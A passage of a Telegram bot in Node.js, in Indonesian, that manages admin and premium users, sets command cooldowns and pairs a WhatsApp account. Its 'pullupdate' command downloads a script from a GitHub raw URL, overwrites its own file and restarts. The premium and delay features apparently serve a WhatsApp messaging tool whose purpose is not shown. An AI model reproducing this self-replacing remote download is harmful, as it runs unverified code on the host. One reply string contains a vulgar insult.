    if (!adminUsers.includes(userId)) return ctx.reply(`Pengguna ${userId} tidak ada dalam daftar Admin.`);
    removeAdmin(userId);
    return ctx.reply(`Pengguna ${userId} telah dihapus dari daftar Admin.`);
});

bot.command("addprem", checkOwner, (ctx) => {
    const args = ctx.message.text.trim().split(" ");
    if (args.length < 2) return ctx.reply("Format Salah!. Example : /addprem 12345678");
    const userId = args[1].toString();
    if (premiumUsers.includes(userId)) return ctx.reply(`Pengguna ${userId} sudah memiliki akses premium.`);
    addPremium(userId);
    return ctx.reply(`Pengguna ${userId} sekarang adalah premium.`);
});

bot.command("delprem", checkOwner, (ctx) => {
    const args = ctx.message.text.trim().split(" ");
    if (args.length < 2) return ctx.reply("Format Salah!. Example : /delprem 12345678");
    const userId = args[1].toString();
    if (!premiumUsers.includes(userId)) return ctx.reply(`Pengguna ${userId} tidak ada dalam daftar premium.`);
    removePremium(userId);
    return ctx.reply(`Pengguna ${userId} telah dihapus dari akses premium.`);
});

bot.command("cekprem", (ctx) => {
    const userId = ctx.from.id.toString();
    if (premiumUsers.includes(userId)) return ctx.reply(`Anda adalah pengguna premium.`);
    else return ctx.reply(`Anda bukan pengguna premium.`);
});

// ======================= SET COOLDOWN =======================
bot.command("setcd", checkOwner, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 3) return ctx.reply("Format Salah!. Example: /setcd Apidelay 5d\n\nd = detik\nm = menit\nj = jam");
    
    const command = args[1];
    const durationStr = args[2];
    
    let duration = parseInt(durationStr);
    const unit = durationStr.slice(-1);
    
    if (unit === 'd') {}
    else if (unit === 'm') duration = duration * 60;
    else if (unit === 'j') duration = duration * 3600;
    else duration = parseInt(durationStr);
    
    setCooldown(command, duration);
    return ctx.reply(`Cooldown untuk /${command} telah diatur ke ${durationStr}`);
});

// ======================= ADDBOT =======================
bot.command("addbot", checkOwner, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return await ctx.reply("Format Salah!. Example : /addbot 62812xxxx");

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

    if (sock && sock.user && isWhatsAppConnected) return await ctx.reply("WhatsApp sudah terhubung!");

    try {
        if (!sock) {
            await startSesi();
            await sleep(2000);
        }

        const code = await sock.requestPairingCode(phoneNumber, "LINUXZL5");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const sentMsg = await ctx.replyWithPhoto(getRandomImage(), {
            caption: `\`\`\`Js
┏━━━━━━━━━━━━━━━━━━━━
┃☇ Nomor : ${phoneNumber}
┃☇ Code : ${formattedCode}
┃☇ Status : Menunggu Koneksi...
┗━━━━━━━━━━━━━━━━━━━━
\`\`\``,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [[{ text: "Batalkan", callback_data: "Close" }]],
            },
        });

        global.pairingMessage = {
            chatId: ctx.chat.id,
            messageId: sentMsg.message_id
        };

    } catch (error) {
        console.error(chalk.red("Gagal melakukan pairing:"), error);
        await ctx.reply("Gagal melakukan pairing! Pastikan nomor WhatsApp valid.");
    }
});

// ======================= DELBOT =======================
bot.command("delbot", checkOwner, async (ctx) => {
    const success = deleteSession();
    if (success) {
        isWhatsAppConnected = false;
        sock = null;
        ctx.reply("Session berhasil dihapus, silahkan /addbot ulang");
    } else {
        ctx.reply("Tidak ada session yang tersimpan saat ini.");
    }
});

// ======================= LISTBOT =======================
bot.command("listbot", checkOwner, async (ctx) => {
    try {
        const waStatus = sock && sock.user && isWhatsAppConnected ? "Terhubung" : "Tidak Terhubung";
        const message = `\`\`\`Js
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ STATUS : ${waStatus}
${sock && sock.user ? `┃ NOMOR : ${linkedWhatsAppNumber || sock.user?.id?.split(":")[0]}` : ''}
┗━━━━━━━━━━━━━━━━━━━━
\`\`\``;
        await ctx.reply(message, { parse_mode: "Markdown" });
    } catch (error) {
        console.error("Gagal menampilkan status bot:", error);
        ctx.reply("Gagal menampilkan status bot.");
    }
});

bot.action("Close", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!OWNER_IDS.includes(userId)) return ctx.answerCbQuery("Lu Siapa Kontol", { show_alert: true });
    try {
        await ctx.deleteMessage();
        if (global.pairingMessage) global.pairingMessage = null;
    } catch (error) {
        console.error(chalk.red("Gagal menghapus pesan:"), error);
        await ctx.answerCbQuery("Gagal menghapus pesan!", { show_alert: true });
    }
});

// ======================= PULL UPDATE =======================
const SCRIPT_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/linuxsciento/refs/heads/main/ovalinux.js";

bot.command("pullupdate", checkOwner, async (ctx) => {
    if (pendingUpdate) {
        await ctx.reply("Mengupdate script...");
        
        try {
            const { data: newScript } = await axios.get(SCRIPT_RAW_URL, { timeout: 15000 });
            const currentScriptPath = __filename;
            const backupPath = `${currentScriptPath}.backup`;
            
            fs.copyFileSync(currentScriptPath, backupPath);
            fs.writeFileSync(currentScriptPath, newScript, "utf8");
            
            await ctx.reply("Update berhasil! Bot akan merestart dalam 3 detik...");
            pendingUpdate = false;
            
            setTimeout(() => process.exit(0), 3000);
        } catch (error) {
            console.error(chalk.red("Gagal update:", error.message));
            await ctx.reply(`Gagal update: ${error.message}`);
            pendingUpdate = false;
        }
    } else {
        try {
            const { data: newScript } = await axios.get(SCRIPT_RAW_URL, { timeout: 10000 });
            const currentScriptPath = __filename;
            const currentScript = fs.readFileSync(currentScriptPath, "utf8");
            
            if (currentScript !== newScript) {
                await ctx.reply(`Update tersedia!\nSilahkan ketik /pullupdate lagi untuk mengupdate script.`);
                pendingUpdate = true;
            } else {
                await ctx.reply(`Script masih versi terbaru!\nTidak ada update tersedia.`);
            }
        } catch (error) {
            console.error(chalk.red("Gagal cek update:", error.message));
            await ctx.reply(`Gagal mengecek update: ${error.message}`);
        }
    }
});

// ======================= ERROR HANDLER =======================
bot.catch((err, ctx) => {
    console.error(chalk.red(`Error untuk ${ctx.updateType}:`, err.message));
    ctx.reply("Terjadi kesalahan, coba lagi nanti.").catch(() => {});
});

// ======================= START BOT =======================
async function startBot() {
    console.log(chalk.blue(`
╭╮╱╭┳━━━┳╮╱╱╭╮╭╮╭━━━┳╮╱╭┳━━━╮
┃┃╱┃┃╭━╮┃┃╱╱┃┃┃┃┃╭━╮┃┃╱┃┃╭━╮┃
┃┃╱┃┃╰━╯┃┃╱╱┃┃┃┃┃╰━╯┃┃╱┃┃╰━━╮
┃┃╱┃┃╭╮╭┫┃╱╭┫┃┃┃┃╭╮╭┫┃╱┃┣━━╮┃
┃╰━╯┃┃┃╰┫╰━╯┃╰━╯┃┃┃╰┫╰━╯┃╰━╯┃
╰━━━┻╯╰━┻━━━┻━━━┻╯╰━┻━━━┻━━━╯
» Information:
☇ Creator : @ItsImLxanderX5
☇ Name Script : Linux X5 
☇ Version : ${currentVersion}

Bot Berhasil Terhubung`));

    await startSesi();
    bot.launch();
    startAutoTokenRefresh();

    console.log(chalk.green("Bot Telegram berjalan..."));
}

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));

validateTokenOnStart().then(() => startBot());